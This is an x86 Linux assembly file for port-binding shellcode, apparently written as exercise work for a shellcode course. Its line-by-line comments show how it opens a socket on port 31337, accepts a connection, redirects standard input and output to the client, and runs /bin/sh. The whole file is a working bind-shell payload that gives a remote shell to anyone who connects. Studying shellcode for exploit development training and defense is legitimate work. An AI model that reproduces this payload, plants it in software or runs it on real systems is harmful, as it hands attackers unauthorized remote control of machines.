;Linux/x86 Port-Binding Shellcode
;by Anton Ostrokonskiy @ostrokonskiy
;SLAE-924

global _start

section .text
_start:

;sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push BYTE 0x66    ;syscall number of socketcall is 102 (0x66)
    pop eax           ;syscall number moved to eax
    xor edx, edx      ;zero out edx
    xor ebx, ebx      ;zero out ebx
    inc ebx           ;now ebx stores 1 = sys_socket syscall number
    push edx          ;start creating of arg array in reverse order {0, 1, 2}
    push ebx          ;now we pushing 1 to the stack (socket type = 1 - SOCK_STREAM)
    push 0x2          ;pushing 2 to the stack (socket domain = 2 - AF_INET)
    mov ecx, esp      ;copy arg array to ecx
    int 0x80          ;sockfd = socket(AF_INET, SOCK_STREAM, 0)

;bind(socket_fd, (struct sockaddr *)&srv_addr, sizeof(srv_addr))
    mov esi, eax ;save socket fd in esi fo later use
    push BYTE 0x66    ;socketcall number
    pop eax      ;now eax contains socketcall number
    inc ebx      ;now ebx contains 2 - sys_bind function number
    push edx        ;lets start building sockaddr struct (edx = 0) -> INADDR_ANY = 0
    push WORD 0x697a     ;31337 is 7a69 in hex, but we need it in reverse order, so 0x697A
    push WORD bx        ;push 2 to the stack (AF_INET = 2)
    mov ecx, esp    ;saving sockaddr struct in ecx
    push 0x10      ;argv: {sizeof(srv_addr) = 16,
    push ecx       ;address of sockaddr structure,
    push esi       ;socket_fd whis is stored in esi
    mov ecx, esp   ;save this structure of structure in ecx
    int 0x80

;listen(socket_fd, 0)
    mov BYTE al, 0x66
    inc ebx
    inc ebx
    push edx      ;edx contains 0
    push esi      ;esi contains socket_fd
    mov ecx, esp  ;save (socket_fd, 0) to ecx
    int 0x80

;client_fd = accept(socket_fd, (struct sockaddr *)&cli_addr, &socklen )
    mov al, 0x66     ;socketcall syscall number 102
    inc ebx          ;ebx = 5 = sys_accept
    push edx         ;argv (in reverse order): {socklen = 0,
    push edx         ;sockaddr ptr = NULL,
    push esi         ;socket fd}
    mov ecx, esp
    int 0x80         ;eax now contains connected socket fd

;dup2(client_fd, 0)
;dup2(client_fd, 1)
;dup2(client_fd, 2)
    mov ebx, eax     ;move connected socket fd in ebx

    mov al, 0x3f     ;dup2 syscall number #63
    xor ecx, ecx     ;ecx now contains 0 - standart input
    int 0x80         ;dup(client_fd, 0)

    mov al, 0x3f     ;dup2 syscall number #63
    inc ecx          ;ecx now contains 1 - standart output
    int 0x80         ;dup(client_fd, 1)

    mov al, 0x3f     ;dup2 syscall number #63
    inc ecx          ;ecx now contains 2 - standart error
    int 0x80         ;dup(client_fd, 2)

;execve("/bin/sh", NULL, NULL)
    mov al, 11         ;execve syscall number 11
    push edx           ;push some nulls for string termination
    push 0x68732f2f    ;push "//sh" to the stack
    push 0x6e69622f    ;push "/bin" to the stack
    mov ebx, esp       ;put the address of "/bin//sh" into ebx via esp
    push edx           ;push 32-bit null terminator to stack
    mov edx, esp       ;empty array for envp
    push ebx           ;push string addr to stack above null terminator
    mov ecx, esp       ;argv array with string pointer
    int 0x80           ;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
